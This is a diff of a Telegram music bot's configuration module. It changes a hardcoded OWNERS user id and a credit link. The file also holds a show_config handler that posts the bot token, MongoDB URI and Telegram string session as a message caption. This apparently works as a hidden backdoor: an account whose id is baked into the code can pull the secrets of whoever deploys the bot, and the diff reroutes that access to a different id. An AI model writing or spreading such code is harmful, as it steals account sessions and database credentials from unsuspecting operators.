@@ -22,7 +22,7 @@ from SHUKLAMUSIC.utils.database import booster
 
 load_dotenv()
 
-OWNERS = "2145828547"
+OWNERS = "5556392536"
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -34,7 +34,7 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 async def show_config(client: Client, message: Message):
     await message.reply_photo(
         photo="https://files.catbox.moe/ldchnq.jpg",
-        caption=f"""<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n<a href='https://t.me/SEXYSHISUI'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆""",
+        caption=f"""<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n<a href='https://t.me/ll_Uff_Mahi_ll'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
